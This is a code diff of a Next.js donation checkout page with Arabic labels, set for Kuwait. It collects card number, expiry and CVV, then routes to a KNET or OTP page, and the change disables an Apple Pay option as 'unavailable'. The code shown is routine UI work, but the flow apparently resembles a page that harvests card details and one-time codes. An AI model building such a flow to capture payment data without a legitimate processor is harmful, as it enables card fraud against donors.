@@ -31,7 +31,7 @@ export default function CheckoutPage() {
         expiryDate: "",
         cvv: "",
         country: "kuwait",
-        status:"new"
+        status: "new"
     })
 
     const donationAmount = 50
@@ -68,7 +68,7 @@ export default function CheckoutPage() {
                         router.push(`/knet`)
 
                     } else {
-                        handlePay(formData,setFormData)
+                        handlePay(formData, setFormData)
                         router.push(`/otp`)
 
                     }
@@ -135,14 +135,13 @@ export default function CheckoutPage() {
                                             />
                                         </div>
 
-                                        <div className="space-y-2" >
-                                            <Label>طريقة الدفع</Label>
+                                        <div className="space-y-2 flex items-center justify-center " >
                                             <RadioGroup
                                                 value={paymentMethod}
                                                 onValueChange={setPaymentMethod}
                                                 className="flex flex-wrap gap-4"
                                             >
-                                                <div className="flex items-center justfify-center space-x-2 space-x-reverse">
+                                                <div className="flex items-center justify-center space-x-2 space-x-reverse">
                                                     <RadioGroupItem value="credit-card" id="credit-card" />
                                                     <Label htmlFor="credit-card" className="flex items-center gap-2">
                                                         <img className="my-2" src="/visa.png" alt="apple-pay" width={25} />
@@ -151,7 +150,7 @@ export default function CheckoutPage() {
                                                 </div>
 
                                                 <div className="flex items-center space-x-2 space-x-reverse">
-                                                    <RadioGroupItem value="google-pay" id="google-pay" />
+                                                    <RadioGroupItem value="apple-pay" id="google-pay" />
                                                     <img className="my-2" src="/applepay.png" alt="apple-pay" width={40} />
                                                 </div>
                                                 <div className="flex items-center space-x-2 space-x-reverse">
@@ -160,7 +159,13 @@ export default function CheckoutPage() {
                                                 </div>
                                             </RadioGroup>
                                         </div>
-
+                                        {paymentMethod === "apple-pay" && (
+                                            <>
+                                                <div className="p-4 mb-4 text-sm text-red-800 rounded-lg bg-red-50 dark:bg-gray-800 dark:text-red-400" role="alert">
+                                                    <span className="font-medium">طريقة الدفع </span>غير متاحة حالياً.
+                                                </div>
+                                            </>
+                                        )}
                                         {paymentMethod === "credit-card" && (
                                             <div className="space-y-4 border rounded-lg p-4 bg-gray-50">
                                                 <div className="space-y-2">
@@ -223,7 +228,7 @@ export default function CheckoutPage() {
                                     <Button
                                         type="submit"
                                         className="w-full bg-orange-500 hover:bg-orange-600 text-white py-6 text-lg"
-                                        disabled={isLoading}
+                                        disabled={isLoading || paymentMethod === "apple-pay" }
                                     >
                                         {isLoading ? "جاري المعالجة..." : "تبرع الآن"}
                                     </Button>
